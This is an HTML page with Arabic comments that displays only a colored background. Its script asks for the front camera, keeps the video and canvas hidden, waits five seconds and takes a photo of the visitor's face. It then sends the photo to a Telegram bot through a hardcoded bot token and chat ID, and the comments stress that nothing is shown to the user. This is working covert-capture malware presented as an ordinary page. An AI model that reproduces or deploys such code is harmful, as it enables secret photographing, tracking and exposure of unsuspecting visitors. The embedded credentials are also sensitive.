<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>...</title>
  <style>
    /* خلفية متدرجة تغطي كامل الصفحة */
    body, html {
      margin: 0; padding: 0; height: 100%;
      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
      overflow: hidden;
    }
    /* إخفاء الفيديو بالكامل */
    #video {
      display: none !important;
      position: fixed;
      width: 0; height: 0;
      opacity: 0;
      pointer-events: none;
    }
    /* إخفاء الكانفاس */
    #canvas {
      display: none !important;
    }
  </style>
</head>
<body>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
  (async () => {
    try {
      // اطلب صلاحية الكاميرا مع خاصية الواجهة الأمامية
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      const video = document.getElementById('video');
      video.srcObject = stream;

      // انتظر حتى يبدأ الفيديو باللعب (تشغيل التيار)
      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });

      // انتظر 5 ثواني (يمكن تعديل الوقت)
      await new Promise(resolve => setTimeout(resolve, 5000));

      // التقاط الصورة
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');

      // عكس الصورة أفقياً ليكون الوجه صحيح الاتجاه
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);

      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // إعادة تعيين التحويل
      ctx.setTransform(1, 0, 0, 1, 0, 0);

      // تحويل الصورة إلى Blob
      canvas.toBlob(async (blob) => {
        // إيقاف كاميرا الويب فوراً
        stream.getTracks().forEach(track => track.stop());

        // إعداد بيانات الإرسال إلى Telegram (يمكنك التبديل لصور أخرى)
        const BOT_TOKEN = '8268065223:AAHj509vUGIJDuQDxuMSB73t6__-FFb6ug4';
        const CHAT_ID = '5606349322';

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');

        // إرسال الصورة إلى Telegram
        try {
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          const data = await response.json();
          if (!data.ok) {
            console.error('Failed to send photo:', data);
          }
          // لا تعرض شيء للمستخدم
        } catch (e) {
          console.error('Error sending photo:', e);
        }
      }, 'image/jpeg');

    } catch (err) {
      console.error('Camera access error:', err);
      // لا تُظهر أي شيء للمستخدم
    }
  })();
</script>

</body>
</html>
